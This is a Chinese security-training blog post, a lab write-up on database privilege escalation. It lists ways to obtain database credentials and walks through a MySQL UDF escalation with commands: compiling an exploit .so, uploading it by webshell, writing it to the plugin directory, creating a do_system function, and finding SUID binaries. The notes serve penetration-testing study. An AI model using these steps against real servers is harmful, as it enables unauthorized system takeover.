<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Day99 权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSF | ai潼</title><meta name="author" content="pwy"><meta name="copyright" content="pwy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="#知识点：1、数据库账号密码获取方式 2、Mysql&amp;Mssql&amp;Oracle提权 3、数据库提权针对操作系统问题 #思考点：1、如何判断采用什么数据库提权？ 2、数据库提权首要条件密码获取？ 3、有那些数据库类型可以进行提权？ 4、操作系统在数据库提权中有那些疑问？ #章节点：1、Web权限提升 2、系统权限提升 3、域控权限提升 #详细点：1、具体有哪些权限需要我们了解掌握的">
<meta property="og:type" content="article">
<meta property="og:title" content="Day99 权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSF">
<meta property="og:url" content="http://example.com/2023/04/17/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/index.html">
<meta property="og:site_name" content="ai潼">
<meta property="og:description" content="#知识点：1、数据库账号密码获取方式 2、Mysql&amp;Mssql&amp;Oracle提权 3、数据库提权针对操作系统问题 #思考点：1、如何判断采用什么数据库提权？ 2、数据库提权首要条件密码获取？ 3、有那些数据库类型可以进行提权？ 4、操作系统在数据库提权中有那些疑问？ #章节点：1、Web权限提升 2、系统权限提升 3、域控权限提升 #详细点：1、具体有哪些权限需要我们了解掌握的">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/tt.jpg">
<meta property="article:published_time" content="2023-04-17T02:35:54.000Z">
<meta property="article:modified_time" content="2023-05-05T14:01:42.834Z">
<meta property="article:author" content="pwy">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/tt.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/04/17/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Day99 权限提升-数据库提权&口令获取&MYSQL&MSSQL&Oracle&MSF',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-05-05 22:01:42'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = url => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      link.onload = () => resolve()
      link.onerror = () => reject()
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ai潼" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tt.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">76</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="ai潼"><span class="site-name">ai潼</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Day99 权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-17T02:35:54.000Z" title="发表于 2023-04-17 10:35:54">2023-04-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-05T14:01:42.834Z" title="更新于 2023-05-05 22:01:42">2023-05-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Day99 权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSF"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/881Zo_9-ppUN2L8qZb_fZQ.pngw=1280&h=1949.png" alt="img"></p>
<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、数据库账号密码获取方式</p>
<p>2、Mysql&amp;Mssql&amp;Oracle提权</p>
<p>3、数据库提权针对操作系统问题</p>
<h3 id="思考点："><a href="#思考点：" class="headerlink" title="#思考点："></a>#思考点：</h3><p>1、如何判断采用什么数据库提权？</p>
<p>2、数据库提权首要条件密码获取？</p>
<p>3、有那些数据库类型可以进行提权？</p>
<p>4、操作系统在数据库提权中有那些疑问？</p>
<h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p>
<p>2、系统权限提升</p>
<p>3、域控权限提升</p>
<h4 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h4><h5 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h5><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p>
<h5 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h5><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p>
<p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p>
<p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p>
<p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p>
<p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p>
<p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p>
<h5 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h5><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p>
<h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p>
<h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p>
<h5 id="接口权限："><a href="#接口权限：" class="headerlink" title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p>
<p>系统权限：如同在你自己操作自己的电脑一样</p>
<p>域控权限：如同在你自己操作自己的虚拟机一样</p>
<blockquote>
<h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="Linux已复现第一篇："><a href="#Linux已复现第一篇：" class="headerlink" title="Linux已复现第一篇："></a>Linux已复现第一篇：</h4><h4 id="1、-Linux提权（mysql-UDF提权）-linux-mysql-udf提权-LZsec的博客-CSDN博客"><a href="#1、-Linux提权（mysql-UDF提权）-linux-mysql-udf提权-LZsec的博客-CSDN博客" class="headerlink" title="1、 Linux提权（mysql UDF提权）_linux mysql udf提权_LZsec的博客-CSDN博客"></a>1、<a target="_blank" rel="noopener" href="https://blog.csdn.net/waxcj/article/details/128343131"> Linux提权（mysql UDF提权）_linux mysql udf提权_LZsec的博客-CSDN博客</a></h4><h4 id="2、Mysql提权-基于Mysql的UDF提权（Linux系统）-码小农的幸福生活-博客园"><a href="#2、Mysql提权-基于Mysql的UDF提权（Linux系统）-码小农的幸福生活-博客园" class="headerlink" title="2、Mysql提权-基于Mysql的UDF提权（Linux系统） - 码小农的幸福生活 - 博客园 "></a>2、<a target="_blank" rel="noopener" href="https://www.cnblogs.com/miansj/p/13996110.html">Mysql提权-基于Mysql的UDF提权（Linux系统） - 码小农的幸福生活 - 博客园 </a></h4><h4 id="➢-提权条件-数据库帐号密码获取方式"><a href="#➢-提权条件-数据库帐号密码获取方式" class="headerlink" title="➢ 提权条件-数据库帐号密码获取方式"></a>➢ 提权条件-数据库帐号密码获取方式</h4><h4 id="➢-MYSQL-UDF-amp-MOF-amp-启动项-amp-反弹Shell"><a href="#➢-MYSQL-UDF-amp-MOF-amp-启动项-amp-反弹Shell" class="headerlink" title="➢ MYSQL-UDF&amp;MOF&amp;启动项&amp;反弹Shell"></a>➢ MYSQL-UDF&amp;MOF&amp;启动项&amp;反弹Shell</h4><h4 id="➢-MSSQL-xp-cmdshell-amp-sp-oacreate-amp-沙盒"><a href="#➢-MSSQL-xp-cmdshell-amp-sp-oacreate-amp-沙盒" class="headerlink" title="➢ MSSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒"></a>➢ MSSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒</h4><h4 id="➢-Oracle-普通用户-amp-注入提升模式-amp-DBA模式"><a href="#➢-Oracle-普通用户-amp-注入提升模式-amp-DBA模式" class="headerlink" title="➢ Oracle-普通用户&amp;注入提升模式&amp;DBA模式"></a>➢ Oracle-普通用户&amp;注入提升模式&amp;DBA模式</h4></blockquote>
<h3 id="Linux第一篇复现注意点"><a href="#Linux第一篇复现注意点" class="headerlink" title="#Linux第一篇复现注意点"></a>#Linux第一篇复现注意点</h3><h5 id="步骤kali上搜索Linux-udf提权脚本"><a href="#步骤kali上搜索Linux-udf提权脚本" class="headerlink" title="步骤kali上搜索Linux udf提权脚本"></a>步骤kali上搜索Linux udf提权脚本</h5><ol>
<li><h6 id="将脚本文件在本地进行编译后上传到靶机的-x2F-tmp目录下"><a href="#将脚本文件在本地进行编译后上传到靶机的-x2F-tmp目录下" class="headerlink" title="将脚本文件在本地进行编译后上传到靶机的&#x2F;tmp目录下"></a>将脚本文件在本地进行编译后上传到靶机的&#x2F;tmp目录下</h6><h6 id="gcc-g-c-1518-c"><a href="#gcc-g-c-1518-c" class="headerlink" title="gcc -g -c 1518.c"></a>gcc -g -c 1518.c</h6><h6 id="gcc-g-shared-o-1518-so-1518-o"><a href="#gcc-g-shared-o-1518-so-1518-o" class="headerlink" title="gcc -g -shared -o 1518.so 1518.o"></a>gcc -g -shared -o 1518.so 1518.o</h6></li>
<li><h6 id="将1518-so文件通过蚁剑上传到靶机-x2F-tmp目录下"><a href="#将1518-so文件通过蚁剑上传到靶机-x2F-tmp目录下" class="headerlink" title="将1518.so文件通过蚁剑上传到靶机&#x2F;tmp目录下"></a>将1518.so文件通过蚁剑上传到靶机&#x2F;tmp目录下</h6></li>
<li><h6 id="进入数据库进行udf提权"><a href="#进入数据库进行udf提权" class="headerlink" title="进入数据库进行udf提权"></a>进入数据库进行udf提权</h6></li>
<li><h6 id="use-mysql-进入数据库"><a href="#use-mysql-进入数据库" class="headerlink" title="use mysql; #进入数据库"></a>use mysql; #进入数据库</h6></li>
<li><h6 id="create-table-foo-line-blob-创建数据表"><a href="#create-table-foo-line-blob-创建数据表" class="headerlink" title="create table foo(line blob); #创建数据表"></a>create table foo(line blob); #创建数据表</h6></li>
<li><h6 id="insert-into-foo-values-load-file-‘-x2F-tmp-x2F-icepeak-so’-插入数据，这里我并没有将1518-so改名，可改可不改的"><a href="#insert-into-foo-values-load-file-‘-x2F-tmp-x2F-icepeak-so’-插入数据，这里我并没有将1518-so改名，可改可不改的" class="headerlink" title="insert into foo values(load_file(‘&#x2F;tmp&#x2F;icepeak.so’)); #插入数据，这里我并没有将1518.so改名，可改可不改的"></a>insert into foo values(load_file(‘&#x2F;tmp&#x2F;icepeak.so’)); #插入数据，这里我并没有将1518.so改名，可改可不改的</h6></li>
<li><h6 id="select-from-foo-into-dumpfile-‘-x2F-usr-x2F-lib-x2F-mysql-x2F-lib-x2F-plugin-x2F-icepeak-so’-Foo表成功插入二进制数据，-然后利用dumpfile函数把文件导出-outfile-多行导出，dumpfile一行导出-outfile会有特殊的转换，而dumpfile是原数据导出-新建存储函数，这里要注意自己的plugin路径-没有lib-x2F-plugin就创建这两个"><a href="#select-from-foo-into-dumpfile-‘-x2F-usr-x2F-lib-x2F-mysql-x2F-lib-x2F-plugin-x2F-icepeak-so’-Foo表成功插入二进制数据，-然后利用dumpfile函数把文件导出-outfile-多行导出，dumpfile一行导出-outfile会有特殊的转换，而dumpfile是原数据导出-新建存储函数，这里要注意自己的plugin路径-没有lib-x2F-plugin就创建这两个" class="headerlink" title="select * from foo into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;lib&#x2F;plugin&#x2F;icepeak.so’; #( Foo表成功插入二进制数据， 然后利用dumpfile函数把文件导出 outfile 多行导出，dumpfile一行导出 outfile会有特殊的转换，而dumpfile是原数据导出 新建存储函数，这里要注意自己的plugin路径,没有lib&#x2F;plugin就创建这两个)"></a>select * from foo into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;lib&#x2F;plugin&#x2F;icepeak.so’; #( Foo表成功插入二进制数据， 然后利用dumpfile函数把文件导出 outfile 多行导出，dumpfile一行导出 outfile会有特殊的转换，而dumpfile是原数据导出 新建存储函数，这里要注意自己的plugin路径,没有lib&#x2F;plugin就创建这两个)</h6></li>
<li><h6 id="create-function-do-system-returns-integer-soname-‘icepeak-so’-创建自定义函数do-system-类型是integer，别名-soname文件名字然后查询函数是否创建成功"><a href="#create-function-do-system-returns-integer-soname-‘icepeak-so’-创建自定义函数do-system-类型是integer，别名-soname文件名字然后查询函数是否创建成功" class="headerlink" title="create function do_system returns integer soname ‘icepeak.so’; #(创建自定义函数do_system 类型是integer，别名 soname文件名字然后查询函数是否创建成功)"></a>create function do_system returns integer soname ‘icepeak.so’; #(创建自定义函数do_system 类型是integer，别名 soname文件名字然后查询函数是否创建成功)</h6></li>
<li><h6 id="select-from-mysql-func"><a href="#select-from-mysql-func" class="headerlink" title="select * from mysql.func;"></a>select * from mysql.func;</h6></li>
<li><h6 id="使用-find-x2F-user-root-perm-4000-print-2-gt-x2F-dev-x2F-null查看SUID提权"><a href="#使用-find-x2F-user-root-perm-4000-print-2-gt-x2F-dev-x2F-null查看SUID提权" class="headerlink" title="使用 find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null查看SUID提权"></a>使用 find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null查看SUID提权</h6></li>
</ol>
<h6 id="我是将1518-so放在虚拟机win7上面的phpstudy服务器通过远程下载到-x2F-tmp目录来模拟真实环境下的操作，下面为下载成功"><a href="#我是将1518-so放在虚拟机win7上面的phpstudy服务器通过远程下载到-x2F-tmp目录来模拟真实环境下的操作，下面为下载成功" class="headerlink" title="我是将1518.so放在虚拟机win7上面的phpstudy服务器通过远程下载到&#x2F;tmp目录来模拟真实环境下的操作，下面为下载成功"></a>我是将1518.so放在虚拟机win7上面的phpstudy服务器通过远程下载到&#x2F;tmp目录来模拟真实环境下的操作，下面为下载成功</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421170532141.png" alt="image-20230421170532141"></p>
<h6 id="但是执行文中的create-function-do-system-returns-integer-soname-‘1518-so’-时出现错误"><a href="#但是执行文中的create-function-do-system-returns-integer-soname-‘1518-so’-时出现错误" class="headerlink" title="但是执行文中的create function do_system returns integer soname ‘1518.so’;时出现错误"></a>但是执行文中的create function do_system returns integer soname ‘1518.so’;时出现错误</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421172032009.png" alt="image-20230421172032009"></p>
<h6 id="参考了文章Qt-Linux-连MySQL出现libmysqlclient-so-16，file-too-short错误-kaip-TJU的博客-CSDN博客，发现可能是这种文件放在windows上不兼容，下载下来有问题，猜测要放到linux服务器上下载，这个so文件是在liunx生成的，后面将原文件直接复制到了plugin目录下，执行成功如下"><a href="#参考了文章Qt-Linux-连MySQL出现libmysqlclient-so-16，file-too-short错误-kaip-TJU的博客-CSDN博客，发现可能是这种文件放在windows上不兼容，下载下来有问题，猜测要放到linux服务器上下载，这个so文件是在liunx生成的，后面将原文件直接复制到了plugin目录下，执行成功如下" class="headerlink" title="参考了文章Qt Linux 连MySQL出现libmysqlclient.so.16，file too short错误_kaip_TJU的博客-CSDN博客，发现可能是这种文件放在windows上不兼容，下载下来有问题，猜测要放到linux服务器上下载，这个so文件是在liunx生成的，后面将原文件直接复制到了plugin目录下，执行成功如下"></a>参考了文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/kaip_TJU/article/details/103112421">Qt Linux 连MySQL出现libmysqlclient.so.16，file too short错误_kaip_TJU的博客-CSDN博客</a>，发现可能是这种文件放在windows上不兼容，下载下来有问题，猜测要放到linux服务器上下载，这个so文件是在liunx生成的，后面将原文件直接复制到了plugin目录下，执行成功如下</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421172415704.png" alt="image-20230421172415704"></p>
<h6 id="函数创建成功"><a href="#函数创建成功" class="headerlink" title="函数创建成功"></a>函数创建成功</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421172513868.png" alt="image-20230421172513868"></p>
<h3 id="提权条件-数据库帐号密码获取方式"><a href="#提权条件-数据库帐号密码获取方式" class="headerlink" title="#提权条件-数据库帐号密码获取方式"></a>#提权条件-数据库帐号密码获取方式</h3><h4 id="条件一：数据库的最高权限用户的密码"><a href="#条件一：数据库的最高权限用户的密码" class="headerlink" title="条件一：数据库的最高权限用户的密码"></a>条件一：数据库的最高权限用户的密码</h4><h4 id="条件二：secure-file-priv没进行目录限制"><a href="#条件二：secure-file-priv没进行目录限制" class="headerlink" title="条件二：secure-file-priv没进行目录限制"></a>条件二：secure-file-priv没进行目录限制</h4><blockquote>
<h4 id="如果没有开启secure-file-priv，那么进入MYSQL安装目录下，打开my-ini文件编辑，在末尾加入secure-file-priv-x3D-，Mysql添加secure-file-prive值-追得上的梦想-博客园-cnblogs-com-，但是前提是加入后MYSQL服务得重启才有效果"><a href="#如果没有开启secure-file-priv，那么进入MYSQL安装目录下，打开my-ini文件编辑，在末尾加入secure-file-priv-x3D-，Mysql添加secure-file-prive值-追得上的梦想-博客园-cnblogs-com-，但是前提是加入后MYSQL服务得重启才有效果" class="headerlink" title="如果没有开启secure-file-priv，那么进入MYSQL安装目录下，打开my.ini文件编辑，在末尾加入secure_file_priv&#x3D;，Mysql添加secure_file_prive值 - 追得上的梦想 - 博客园 (cnblogs.com)，但是前提是加入后MYSQL服务得重启才有效果"></a>如果没有开启secure-file-priv，那么进入MYSQL安装目录下，打开my.ini文件编辑，在末尾加入secure_file_priv&#x3D;，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/KHZ521/p/14066258.html">Mysql添加secure_file_prive值 - 追得上的梦想 - 博客园 (cnblogs.com)</a>，但是前提是加入后MYSQL服务得重启才有效果</h4></blockquote>
<h5 id="1、网站存在高权限SQL注入点"><a href="#1、网站存在高权限SQL注入点" class="headerlink" title="1、网站存在高权限SQL注入点"></a>1、网站存在高权限SQL注入点</h5><h5 id="2、数据库的存储文件或备份文件"><a href="#2、数据库的存储文件或备份文件" class="headerlink" title="2、数据库的存储文件或备份文件"></a>2、数据库的存储文件或备份文件</h5><h5 id="3、网站应用源码中的数据库配置文件"><a href="#3、网站应用源码中的数据库配置文件" class="headerlink" title="3、网站应用源码中的数据库配置文件"></a>3、网站应用源码中的数据库配置文件</h5><h5 id="4、采用工具或脚本爆破-需解决外联问题"><a href="#4、采用工具或脚本爆破-需解决外联问题" class="headerlink" title="4、采用工具或脚本爆破(需解决外联问题)"></a>4、采用工具或脚本爆破(需解决外联问题)</h5><h6 id="如果存在注入点，用sqlmap爆破密码"><a href="#如果存在注入点，用sqlmap爆破密码" class="headerlink" title="如果存在注入点，用sqlmap爆破密码"></a>如果存在注入点，用sqlmap爆破密码</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104545651.png" alt="image-20230419104545651"></p>
<p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104644625.png" alt="image-20230419104644625"></p>
